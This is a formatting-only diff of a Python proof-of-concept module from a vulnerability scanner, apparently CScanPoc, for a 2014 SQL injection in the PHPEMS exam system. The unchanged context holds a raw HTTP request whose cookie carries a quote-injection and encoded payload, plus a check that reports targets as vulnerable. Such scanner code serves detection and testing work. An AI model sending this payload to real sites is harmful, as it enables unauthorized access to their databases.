@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import urlparse
 
+
 class Vuln(ABVuln):
-    vuln_id = 'PHPEMS_0012' # 平台漏洞编号，留空
+    vuln_id = 'PHPEMS_0012'  # 平台漏洞编号，留空
     name = 'PHPEMS SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2014-04-17'  # 漏洞公布时间
     desc = '''
         PHPEMS（PHP Exam Management System）在线模拟考试系统基于PHP+Mysql开发，主要用于搭建模拟考试平台，支持多种题型和展现方式，是国内首款支持题冒题和自动评分与教师评分相结合的PHP开源在线模拟考试系统。
@@ -22,6 +23,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'PHPEMS'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'd2c07055-2ef9-4c72-a135-b4f9ebf0bbd0'
@@ -56,8 +58,8 @@ Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
 Cookie: exam_psid=c6f1b7acd452e6d72a3ede0f501a9211'; exam_currentuser=%25B4%2585%258B%2585%25CE%25BE%258D%257C%2586%2585u%25BE%25B8%25BE%25C6%25B4%25C2%25B9%25C8%25BE%25B8%25BD%25BC%25AFu%2586%25C6%2585%2585%2585u%2581%258Bm%258E%25BE%258D%257C%2588%2585u%25BE%25B8%25BE%25C6%25B4%25C2%25B9%25C3%25AC%25C6%25BE%25CA%25BA%25C5%25AFu%2586%25C6%2585%2586%257D%258Dm%258C%2581%25B8%2582%258C%257D%2584%2583%258C%2581%2588%25B0%25B5%2582%2585%25AE%258C%257D%25B4%2580%2587%2584%25B7%25AF%2588%25AC%2586%257E%2583%257C%2584%257Du%2586%25C6%2585%258C%2585u%25BE%25B8%25BE%25C6%25B4%25C2%25B9%25BC%25BBu%2586%25C6%2585%258C%2585u%257C%2585%2582%2581%257B%2581%257B%2581%257Cu%2586%25C6%2585%2584%257F%258Dm%25C6%25B0%25C6%25BE%25BC%25BA%25C1%25B2%25C5%25BA%25C8%25BB%25BC%25AFu%2586%25C6%2585%2584%2585u%2583u%2586%25C6%2585%2584%2581%258Dm%25C6%25B0%25C6%25BE%25BC%25BA%25C1%25B7%25C2%25B2%25BC%25B9%25C7%25B4%25C0%25B0u%2586%25BC%2585%2584%257E%258B%2584%2588%257C%2589%2582%258B%257E%258E%25BE%258D%257C%2588%2585u%25BE%25B8%25BE%25C6%25B4%25C2%25B9%25C8%25BE%25B8%25BD%25C1%25AC%25C0%25B0u%2586%25C6%2585%2589%2585u%257C%2584%257C%2584%257C%2584m%258E%25BE%258D%257C%2589%2585u%25BE%25B8%25BE%25C6%25B4%25C2%25B9%25C7%25B4%25C0%25B0%25BF%25B4%25C0%25B4%25C7m%258E%25B4%258D%257C%2586%2583%258C%2580%2584%2581%258A%2583%2586%2586%25C6%2585%258C%2585u%25BE%25B8%25BE%25C6%25B4%25C2%25B9%25BC%25AFu%2586%25C6%2585%2586%257D%258Dm%25B6%2581%25B9%257C%25B5%2582%25B4%25AE%25B7%257F%2588%257D%25B8%2581%25B7%2582%2585%25AC%2586%25B0%25B7%25B0%2583%25B1%2588%257B%2584%25AC%258C%257D%2584%257Cu%2586%25D0; CNZZDATA5243664=cnzz_eid%3D2105242747-1389515449-%26ntime%3D1389515449%26cnzz_a%3D3%26sin%3Dnone%26ltime%3D1389515448225
             """.format(host=host, url1=self.target, url2=self.target)
 
-            code, head, res, err, _  = hh.http(self.target, raw=raw)
-            if  code == 200 and "c6f1b7acd452e6d72a3ede0f501a9211" in r.content:
+            code, head, res, err, _ = hh.http(self.target, raw=raw)
+            if code == 200 and "c6f1b7acd452e6d72a3ede0f501a9211" in r.content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
@@ -66,6 +68,7 @@ Cookie: exam_psid=c6f1b7acd452e6d72a3ede0f501a9211'; exam_currentuser=%25B4%2585
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
